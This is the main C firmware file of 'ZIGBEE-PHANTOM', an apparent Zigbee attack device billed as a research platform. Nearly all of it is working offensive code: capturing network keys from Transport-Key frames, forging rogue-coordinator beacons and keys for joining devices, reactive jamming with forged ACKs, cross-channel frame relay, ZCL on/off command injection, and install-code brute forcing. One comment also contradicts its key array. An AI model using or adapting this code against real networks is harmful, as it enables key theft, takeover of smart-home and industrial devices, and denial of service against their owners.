/*
 * main.c — ZIGBEE-PHANTOM firmware entry point and main state machine
 * Author: jayis1
 * License: GPL-2.0
 *
 * This is the top-level firmware for the ZIGBEE-PHANTOM, a CC2652R1F-based
 * IEEE 802.15.4 / Zigbee security research platform. It implements a mode
 * state machine (SNIFF / KEY-HUNT / ROGUE-COORD / JAM / RELAY), drives the
 * radio core in promiscuous mode, parses captured frames, extracts Zigbee
 * Transport-Key frames for key recovery, streams captures over USB/BLE via
 * the ESP32-S3 backhaul, writes PCAP to MicroSD, and provides a 5-way
 * joystick + OLED operator interface.
 *
 * Build: see Makefile (arm-none-eabi-gcc + TI CC26xx driverlib)
 */
#include "board.h"
#include "registers.h"
#include "drivers/cc2652_rf.h"
#include "drivers/zigbee_mac.h"
#include "drivers/zigbee_aps.h"
#include "drivers/crypto.h"
#include "drivers/oled.h"
#include "drivers/joystick.h"
#include "drivers/sd_pcap.h"
#include "drivers/esp_backhaul.h"
#include <string.h>

/* Global device context */
zb_ctx_t g_ctx = {
    .mode = MODE_SNIFF,
    .channel = 15,
    .rssi = -128,
    .lqi = 0,
    .frame_counter = 0,
    .key_frames = 0,
    .injected_frames = 0,
    .sd_present = false,
    .esp_link_up = false,
    .jam_filter_set = false,
    .filter_panid = 0xFFFF,
    .filter_eui = {0},
    .jam_rssi_thresh = -70,
    .batt_mv = 4200,
    .batt_pct = 100,
};

/* ---- LED helpers ---- */
static void led_rx(bool on){ if(on) GPIO_SET(LED_RX_DIO); else GPIO_CLR(LED_RX_DIO); }
static void led_tx(bool on){ if(on) GPIO_SET(LED_TX_DIO); else GPIO_CLR(LED_TX_DIO); }
static void led_key(bool on){ if(on) GPIO_SET(LED_KEY_DIO); else GPIO_CLR(LED_KEY_DIO); }
static void led_err(bool on){ if(on) GPIO_SET(LED_ERR_DIO); else GPIO_CLR(LED_ERR_DIO); }

/* ---- I2C helper for MAX17048 fuel gauge ---- */
static uint8_t i2c_read_reg(uint8_t addr, uint8_t reg)
{
    volatile uint8_t *sa = (volatile uint8_t *)(I2C_BASE + I2C_O_SA);
    volatile uint32_t *mctrl = (volatile uint32_t *)(I2C_BASE + I2C_O_MCTRL);
    volatile uint8_t *mdr = (volatile uint8_t *)(I2C_BASE + I2C_O_MDR);
    *sa = (addr << 1);
    *mdr = reg;
    *mctrl = I2C_MCTRL_RUN | I2C_MCTRL_START;
    while (*mctrl & I2C_MCTRL_RUN) { }
    *mctrl = I2C_MCTRL_RUN | I2C_MCTRL_START | I2C_MCTRL_ACK;
    while (*mctrl & I2C_MCTRL_RUN) { }
    return *mdr;
}

static void battery_update(void)
{
    /* MAX17048 VCELL register 0x02 (2 bytes, 78.125 µV/cell) */
    uint8_t hi = i2c_read_reg(MAX17048_ADDR, 0x02);
    uint8_t lo = i2c_read_reg(MAX17048_ADDR, 0x03);
    uint16_t raw = ((uint16_t)hi << 8) | lo;
    /* Vcell = raw * 78.125 µV → mV = raw * 78.125 / 1000 ≈ raw / 12.8 */
    g_ctx.batt_mv = (uint16_t)((uint32_t)raw * 78U / 1000U);
    /* State of charge register 0x04 (percent) */
    uint8_t soc_hi = i2c_read_reg(MAX17048_ADDR, 0x04);
    g_ctx.batt_pct = soc_hi;
    if (g_ctx.batt_mv < BATT_MV_CRIT) led_err(true);
}

/* ---- Mode handlers ---- */

/* SNIFF: passive promiscuous capture. For every received frame, parse MAC,
 * check PAN/EUI filters, write to SD pcap, stream to ESP backhaul, and update
 * OLED counters. If the frame is a secured MAC command carrying an APS
 * Transport-Key, hand off to the key-extraction path. */
static void mode_sniff(void)
{
    rf_rx_entry_t entry;
    if (rf_rx_read(&entry) != 0) return;

    g_ctx.rssi = entry.rssi;
    g_ctx.lqi  = entry.lqi;
    g_ctx.frame_counter++;

    zb_mac_frm_t mac;
    if (zb_mac_parse(entry.frame, entry.length, &mac) != 0) return;

    /* Apply PAN filter (0xFFFF = all) */
    if (!zb_mac_match_pan(&mac, g_ctx.filter_panid)) return;

    /* Apply source-EUI filter (all-zeros = any) */
    if (!zb_mac_match_src_eui(&mac, g_ctx.filter_eui)) return;

    /* Write to SD pcap */
    if (g_ctx.sd_present) {
        sd_pcap_write_frame(entry.channel, entry.rssi, entry.lqi,
                            rf_get_timestamp_us(), entry.frame, entry.length);
    }

    /* Stream to ESP backhaul (KillerBee-compatible) */
    if (g_ctx.esp_link_up) {
        esp_send_frame(entry.channel, entry.rssi, entry.lqi,
                       rf_get_timestamp_us(), entry.frame, entry.length);
    }

    /* If MAC data frame with APS payload, check for Transport-Key */
    if (mac.type == FRM_TYPE_DATA && mac.payload_len > 0) {
        zb_aps_frm_t aps;
        if (zb_aps_parse(mac.payload, mac.payload_len, &aps) == 0) {
            if (aps.cmd_id == APS_CMD_TRANSPORT_KEY) {
                /* Key capture! Light the KEY LED and notify the app. */
                led_key(true);
                g_ctx.key_frames++;
                uint8_t key_blob[16];
                uint8_t key_type, key_seq;
                zb_aps_extract_transport_key(&aps, key_blob, &key_type, &key_seq);
                /* Send event to ESP32 with the key material */
                esp_send_event(ESP_EVT_KEY_CAPTURED, key_blob, 16);
            }
        }
    }

    led_rx(true);
    for (volatile int i=0;i<2000;i++);
    led_rx(false);
}

/* KEY-HUNT: focused mode that filters for Transport-Key frames and runs an
 * energy scan first to find the active channel. */
static void mode_keyhunt(void)
{
    /* Energy scan to find the active channel, then sniff focused on
     * Transport-Key captures. */
    int8_t rssi[16];
    rf_energy_scan(rssi);
    int8_t best = -128; uint8_t best_ch = 15;
    for (uint8_t i=0;i<16;i++){
        if (rssi[i] > best){ best = rssi[i]; best_ch = IEEE802154_CHAN_MIN + i; }
    }
    g_ctx.channel = best_ch;
    rf_set_channel(best_ch);
    rf_start_promiscuous_rx();

    /* Fall through to sniff with key-filter emphasis */
    mode_sniff();
}

/* ROGUE-COORD: forge a Zigbee NWK Beacon advertising join-permitted, with the
 * spoofed PAN ID recovered during sniffing. When a device issues a Join
 * Request, respond with a forged Transport-Key carrying a chosen network
 * key. */
static void mode_rogue_coord(void)
{
    uint8_t beacon[128];
    uint8_t ext_panid[8] = {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0};
    uint16_t spoof_pan = (g_ctx.filter_panid != 0xFFFF) ? g_ctx.filter_panid : 0x1A2B;

    int blen = zb_mac_build_beacon(beacon, spoof_pan, ext_panid, g_ctx.channel,
                                   true, true, 2, 3);
    rf_set_tx_power(20);   /* +20 dBm via nRF21540 FEM */
    rf_tx_frame(beacon, (uint8_t)blen);
    g_ctx.injected_frames++;
    led_tx(true);
    for (volatile int i=0;i<50000;i++);
    led_tx(false);
    rf_set_tx_power(5);

    /* Now listen for a Join Request (MAC_CMD_ASSOC_REQ) and respond with
     * a forged Transport-Key. */
    rf_start_promiscuous_rx();
    rf_rx_entry_t entry;
    if (rf_rx_read(&entry) == 0) {
        zb_mac_frm_t mac;
        if (zb_mac_parse(entry.frame, entry.length, &mac) == 0 &&
            mac.type == FRM_TYPE_CMD) {
            /* Build a forged Transport-Key carrying our chosen network key.
             * The network key is all-zeros for demonstration; in a real
             * engagement the operator picks a random key. */
            uint8_t nwk_key[16] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
                                   0x11, 0x22, 0x33, 0x44, 0x55, 0x66,
                                   0x77, 0x88, 0x99, 0x00};
            uint8_t tk_frame[64];
            /* APS Transport-Key: cmd_id=0x05, key_type=1 (NWK), key, seq=0,
             * dst_eui, src_eui. We construct a minimal MAC data frame. */
            uint8_t aps_payload[1 + 1 + 16 + 1 + 8 + 8];
            uint8_t aps_idx = 0;
            aps_payload[aps_idx++] = 0x01;  /* APS frame ctrl: cmd frame */
            aps_payload[aps_idx++] = APS_CMD_TRANSPORT_KEY;
            aps_payload[aps_idx++] = APS_KEY_TYPE_NWK;
            memcpy(&aps_payload[aps_idx], nwk_key, 16); aps_idx += 16;
            aps_payload[aps_idx++] = 0x00;  /* key seq */
            memcpy(&aps_payload[aps_idx], mac.src_addr, 8); aps_idx += 8;
            memcpy(&aps_payload[aps_idx], ext_panid, 8); aps_idx += 8;

            int tlen = zb_mac_build_data(tk_frame, spoof_pan, 0x0000,
                                         spoof_pan, 0x0000, mac.seq_num,
                                         aps_payload, aps_idx, false, true);
            rf_tx_frame(tk_frame, (uint8_t)tlen);
            g_ctx.injected_frames++;
        }
    }
}

/* JAM: frame-filtered reactive jamming. When a frame matching the filter is
 * received, transmit a corrupted ACK or a noise burst to disrupt the link. */
static void mode_jam(void)
{
    rf_rx_entry_t entry;
    if (rf_rx_read(&entry) != 0) return;
    if (entry.rssi < g_ctx.jam_rssi_thresh) return;   /* too weak to bother */

    zb_mac_frm_t mac;
    if (zb_mac_parse(entry.frame, entry.length, &mac) != 0) return;
    if (!zb_mac_match_pan(&mac, g_ctx.filter_panid)) return;
    if (!zb_mac_match_src_eui(&mac, g_ctx.filter_eui)) return;

    /* Forge an ACK with the same sequence number — but the original sender
     * already expects an ACK from the real recipient. By sending a forged
     * ACK we cause the sender to believe delivery succeeded while the real
     * recipient never got it — a silent drop. Alternatively, transmit a
     * corrupted frame to collide with the real ACK. */
    uint8_t ack[5];
    int alen = zb_mac_build_ack(ack, mac.seq_num);
    /* Corrupt the FCS so the receiver rejects it */
    ack[alen - 1] ^= 0xFF;
    rf_tx_frame(ack, (uint8_t)alen);
    g_ctx.injected_frames++;
    led_tx(true);
    for (volatile int i=0;i<1000;i++);
    led_tx(false);
}

/* RELAY: cross-channel relay. Receive on channel A, re-inject on channel B.
 * Demonstrates that channel separation is not a security boundary. */
static void mode_relay(void)
{
    static uint8_t relay_channel_b = 20;
    rf_rx_entry_t entry;
    if (rf_rx_read(&entry) != 0) return;

    /* Switch to the second channel and re-inject the captured frame */
    uint8_t saved_ch = g_ctx.channel;
    rf_stop_rx();
    rf_set_channel(relay_channel_b);
    rf_tx_frame(entry.frame, entry.length);
    g_ctx.injected_frames++;
    led_tx(true);
    for (volatile int i=0;i<2000;i++);
    led_tx(false);
    rf_set_channel(saved_ch);
    rf_start_promiscuous_rx();
}

/* ---- ZCL injection (triggered by ESP_CMD_INJECT_ZCL) ---- */
static void inject_zcl(uint16_t dst_short, uint8_t cluster_cmd, uint8_t seq)
{
    uint8_t zcl[3];
    zb_zcl_build_onoff(zcl, seq, cluster_cmd);
    uint8_t frame[64];
    int len = zb_mac_build_data(frame, g_ctx.filter_panid, dst_short,
                                g_ctx.filter_panid, 0x0000, seq,
                                zcl, 3, false, true);
    rf_set_tx_power(20);
    rf_tx_frame(frame, (uint8_t)len);
    g_ctx.injected_frames++;
    rf_set_tx_power(5);
    led_tx(true);
    for (volatile int i=0;i<5000;i++);
    led_tx(false);
}

/* ---- UI: mode selection menu ---- */
static void ui_mode_menu(void)
{
    oled_clear();
    oled_set_cursor(0, 0); oled_puts("ZIGBEE-PHANTOM");
    oled_set_cursor(0, 1); oled_puts("Select mode:");
    oled_set_cursor(0, 2); oled_puts("> SNIFF");
    oled_set_cursor(0, 3); oled_puts("  KEYHUNT");
    oled_set_cursor(0, 4); oled_puts("  ROGUE-COORD");
    oled_set_cursor(0, 5); oled_puts("  JAM");
    oled_set_cursor(0, 6); oled_puts("  RELAY");
    oled_set_cursor(0, 7); oled_puts("Center=select");
}

/* ---- Handle a command from the ESP32 backhaul ---- */
static void handle_esp_cmd(void)
{
    uint8_t cmd, payload[64], plen;
    if (esp_recv_cmd(&cmd, payload, &plen, sizeof(payload)) != 0) return;
    switch (cmd) {
    case ESP_CMD_SET_MODE:
        if (plen >= 1) {
            g_ctx.mode = (zb_mode_t)(payload[0] % MODE_NUM);
            esp_send_event(ESP_EVT_MODE_CHANGE, &payload[0], 1);
        }
        break;
    case ESP_CMD_SET_CHANNEL:
        if (plen >= 1) {
            uint8_t ch = payload[0];
            if (ch >= IEEE802154_CHAN_MIN && ch <= IEEE802154_CHAN_MAX) {
                g_ctx.channel = ch;
                rf_set_channel(ch);
                esp_send_event(ESP_EVT_CHANNEL_CHANGE, &ch, 1);
            }
        }
        break;
    case ESP_CMD_SET_PAN_FILTER:
        if (plen >= 2) {
            g_ctx.filter_panid = (uint16_t)(payload[0] | (payload[1] << 8));
        }
        break;
    case ESP_CMD_SET_EUI_FILTER:
        if (plen >= 8) memcpy(g_ctx.filter_eui, payload, 8);
        break;
    case ESP_CMD_INJECT_ZCL:
        if (plen >= 3) {
            uint16_t dst = (uint16_t)(payload[0] | (payload[1] << 8));
            uint8_t zcl_cmd = payload[2];
            inject_zcl(dst, zcl_cmd, (uint8_t)(g_ctx.injected_frames & 0xFF));
        }
        break;
    case ESP_CMD_INJECT_BEACON:
        mode_rogue_coord();
        break;
    case ESP_CMD_ENERGY_SCAN: {
        int8_t rssi[16];
        rf_energy_scan(rssi);
        esp_send_frame(0xFF, 0, 0, 0, (const uint8_t *)rssi, 16);
        break;
    }
    case ESP_CMD_BRUTE_KEY:
        /* Trigger on-device install-code brute force against the last
         * captured Transport-Key blob. The result is sent as an event. */
        if (plen >= 17) {
            uint8_t enc_key[16]; memcpy(enc_key, payload, 16);
            uint8_t ic_len = payload[16];
            uint8_t ic_out[16], tclk_out[16], nwk_key_out[16];
            int rc = zb_crypto_brute_install_code(enc_key, ic_len, 1000000U,
                                                 ic_out, tclk_out, nwk_key_out, NULL);
            if (rc == 0) {
                uint8_t result[48];
                memcpy(result, ic_out, 16);
                memcpy(result + 16, tclk_out, 16);
                memcpy(result + 32, nwk_key_out, 16);
                esp_send_event(ESP_EVT_KEY_CAPTURED, result, 48);
            } else {
                esp_send_event(ESP_EVT_ERROR, NULL, 0);
            }
        }
        break;
    case ESP_CMD_GET_STATUS: {
        uint8_t status[16];
        status[0] = (uint8_t)g_ctx.mode;
        status[1] = g_ctx.channel;
        status[2] = (uint8_t)g_ctx.rssi;
        status[3] = g_ctx.batt_pct;
        memcpy(status + 4, &g_ctx.frame_counter, 4);
        memcpy(status + 8, &g_ctx.key_frames, 4);
        memcpy(status + 12, &g_ctx.injected_frames, 4);
        esp_send_event(0x00, status, 16);
        break;
    }
    default:
        esp_send_event(ESP_EVT_ERROR, &cmd, 1);
        break;
    }
}

/* ---- Update OLED display ---- */
static void ui_update(void)
{
    oled_status_channel(g_ctx.channel, g_ctx.rssi);
    oled_status_mode((uint8_t)g_ctx.mode);
    oled_status_counters(g_ctx.frame_counter, g_ctx.key_frames, g_ctx.injected_frames);
    /* Battery percentage bar */
    oled_draw_hbar(0, 7, 60, g_ctx.batt_pct);
    char b[8];
    b[0] = ' '; b[1] = (g_ctx.batt_pct / 10) + '0'; b[2] = (g_ctx.batt_pct % 10) + '0'; b[3] = '%'; b[4] = 0;
    oled_set_cursor(60, 7); oled_puts(b);
}

/* ---- Main loop ---- */
int main(void)
{
    /* Disable watchdog for timing determinism during capture */
    volatile uint32_t *wdt = (volatile uint32_t *)(WDT_BASE + WDT_O_CTL);
    *wdt = WDT_CTL_DIS;

    /* Initialize hardware */
    rf_init();
    oled_init();
    joystick_init();
    esp_backhaul_init();

    /* Boot banner */
    oled_clear();
    oled_set_cursor(0, 0); oled_puts("ZIGBEE-PHANTOM");
    oled_set_cursor(0, 1); oled_puts("by jayis1");
    oled_set_cursor(0, 2); oled_puts("Initializing...");
    for (volatile int i=0;i<1000000;i++);

    /* Initialize SD card for pcap capture */
    if (sd_pcap_init() == 0) {
        g_ctx.sd_present = true;
        oled_set_cursor(0, 3); oled_puts("SD: OK");
    } else {
        oled_set_cursor(0, 3); oled_puts("SD: none");
    }

    /* Set default channel and start promiscuous RX */
    g_ctx.channel = 15;
    rf_set_channel(g_ctx.channel);
    rf_start_promiscuous_rx();
    g_ctx.esp_link_up = esp_link_up();

    /* Show mode menu briefly, then enter main loop */
    ui_mode_menu();
    for (volatile int i=0;i<2000000;i++);
    oled_clear();

    uint32_t last_ui_update = 0;
    uint32_t last_batt_update = 0;

    for (;;) {
        /* Handle joystick input for mode/channel changes */
        joy_dir_t joy = joystick_read();
        switch (joy) {
        case JOY_UP:
            if (g_ctx.channel < IEEE802154_CHAN_MAX) {
                g_ctx.channel++;
                rf_set_channel(g_ctx.channel);
            }
            break;
        case JOY_DOWN:
            if (g_ctx.channel > IEEE802154_CHAN_MIN) {
                g_ctx.channel--;
                rf_set_channel(g_ctx.channel);
            }
            break;
        case JOY_LEFT:
            g_ctx.mode = (zb_mode_t)((g_ctx.mode + MODE_NUM - 1) % MODE_NUM);
            break;
        case JOY_RIGHT:
            g_ctx.mode = (zb_mode_t)((g_ctx.mode + 1) % MODE_NUM);
            break;
        case JOY_CENTER:
            /* Center = confirm / trigger immediate action */
            if (g_ctx.mode == MODE_ROGUE_COORD) mode_rogue_coord();
            break;
        default: break;
        }

        /* Handle backhaul commands */
        handle_esp_cmd();

        /* Run the active mode handler */
        switch (g_ctx.mode) {
        case MODE_SNIFF:      mode_sniff();      break;
        case MODE_KEYHUNT:    mode_keyhunt();    break;
        case MODE_ROGUE_COORD: mode_rogue_coord(); break;
        case MODE_JAM:        mode_jam();        break;
        case MODE_RELAY:      mode_relay();      break;
        default:              mode_sniff();      break;
        }

        /* Periodic UI update (~ every 250 ms) */
        uint32_t now = rf_get_timestamp_us();
        if ((now - last_ui_update) > 250000U) {
            ui_update();
            last_ui_update = now;
        }
        /* Periodic battery update (~ every 30 s) */
        if ((now - last_batt_update) > 30000000U) {
            battery_update();
            last_batt_update = now;
        }
    }
    /* Never returns */
    return 0;
}